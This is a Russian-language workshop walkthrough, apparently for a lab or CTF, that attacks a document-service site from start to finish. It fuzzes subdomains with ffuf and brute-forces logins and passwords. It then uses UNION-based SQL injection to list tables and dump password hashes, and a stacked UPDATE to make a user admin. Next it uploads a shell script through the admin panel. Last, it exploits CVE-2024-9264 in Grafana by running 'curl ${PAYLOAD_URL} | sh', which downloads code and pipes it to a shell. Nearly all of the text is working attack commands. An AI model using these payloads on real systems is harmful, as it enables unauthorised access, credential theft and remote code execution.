## Разведка — фаззинг поддоменов

```bash
ffuf -u http://FUZZ.dmitrybakhtenkov.tech -w wordlists/subdomains.txt
```
---

## User Enumeration

### Брутфорс логинов через ffuf

```bash
ffuf -u http://docs.dmitrybakhtenkov.tech/api/auth/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"FUZZ","password":"test"}' \
  -w wordlists/slavic-names.txt \
  -mc 400
```

### Брутфорс паролей

Для каждого найденного пользователя перебираем пароли:

```bash
ffuf -u http://docs.dmitrybakhtenkov.tech/api/auth/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"i.ivanov","password":"FUZZ"}' \
  -w wordlists/common-passwords.txt \
  -mc 200
```
## Вход в систему

Логинимся через UI (`docs.dmitrybakhtenkov.tech`) или curl:

```bash
curl -s -X POST http://docs.dmitrybakhtenkov.tech/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"a.petrov","password":"password123"}'
```

## SQL Injection 
### Определение количества колонок

```sql
' ORDER BY 1--
```

### UNION SELECT, список таблиц

```sql
' UNION SELECT 1,tablename,tableowner,'x',1,NOW() FROM pg_catalog.pg_tables WHERE schemaname='public'--
```

### Структура таблицы user_roles

```sql
' UNION SELECT 1,column_name,data_type,'x',1,NOW() FROM information_schema.columns WHERE table_name='user_roles'--
```
### Структура таблицы users

```sql
' UNION SELECT 1,column_name,data_type,'x',1,NOW() FROM information_schema.columns WHERE table_name='users'--
```

### Узнаём id роли admin:

```bash
' UNION SELECT id,name,'x','x',1,NOW() FROM roles--
```

## Шаг 9.1. Просмотр списка пользователей и их ролей

Перед эскалацией полезно увидеть всех пользователей и их текущие роли.

### Список пользователей (id, username, password_hash)

```sql
' UNION SELECT id,username,password_hash,'x',1,NOW() FROM users--
```

## Privilege Escalation

Из шага 9.1 мы знаем, что `a.petrov` — это `user_id = 2`, и его текущая роль — `user` (role_id = 1).

```sql
; UPDATE user_roles SET role_id = 2 WHERE user_id = 2--
```

## Загрузка payload через админку

Создаём простой shell-скрипт:

```bash
echo '#!/bin/sh
echo "PWNED! Workshop flag: FLAG{rce_via_grafana_duckdb}" > /tmp/flag.txt
cat /tmp/flag.txt' > payload.sh
```

Загружаем через админку (`docs.dmitrybakhtenkov.tech/admin`) или curl:

```bash
curl -s -X POST http://docs.dmitrybakhtenkov.tech/api/admin/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@payload.sh"
```

**Результат:** получаем публичный URL вида `http://s3.dmitrybakhtenkov.tech/documents/<uuid>/payload.sh`

Сохраняем URL:

```bash
export PAYLOAD_URL="http://s3.dmitrybakhtenkov.tech/documents/<uuid>/payload.sh"
```

## Эксплуатация CVE-2024-9264


### RCE (только Grafana 11.0.0!)

```bash
python3 grafana-exploit/exploit.py -u viewer -p {password} \
  -c "curl ${PAYLOAD_URL} | sh" \
  http://grafana.dmitrybakhtenkov.tech
```
